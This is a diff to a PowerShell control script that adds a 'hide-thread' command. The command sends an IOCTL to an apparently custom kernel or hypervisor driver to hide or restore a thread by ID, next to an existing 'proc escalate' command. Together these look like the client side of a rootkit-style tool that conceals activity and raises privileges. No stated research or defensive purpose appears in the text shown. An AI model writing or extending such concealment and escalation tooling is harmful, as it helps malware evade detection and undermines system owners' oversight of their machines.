@@ -5284,6 +5284,18 @@ try {
                     throw ("proc escalate failed: code={0}" -f [BitConverter]::ToUInt64($out, 8))
                 }
             }
+            'hide-thread' {
+                if ($null -eq $Arg1) { throw 'proc hide-thread: usage: proc hide-thread <tid> [unhide]' }
+                $hide = 1
+                if ($Arg2 -eq 'unhide') { $hide = 0 }
+                $req = New-ProcReq 14 ([uint32]::Parse($Arg1)) $hide 0 0
+                $out = Invoke-YghvIoctl -Code (IoCtl 0x838) -InBytes $req -OutputLength 4096
+                if ([BitConverter]::ToUInt64($out, 0) -eq 1) {
+                    Write-Output ("proc: tid={0} thread {1}" -f $Arg1, $(if ($hide) {'hidden'} else {'restored'}))
+                } else {
+                    throw ("proc hide-thread failed: code={0}" -f [BitConverter]::ToUInt64($out, 8))
+                }
+            }
             # Anything left is a bare pid: single-process query.
             $qp = [uint32]::Parse($v)
             $req = New-ProcReq 1 $qp 0 0 0
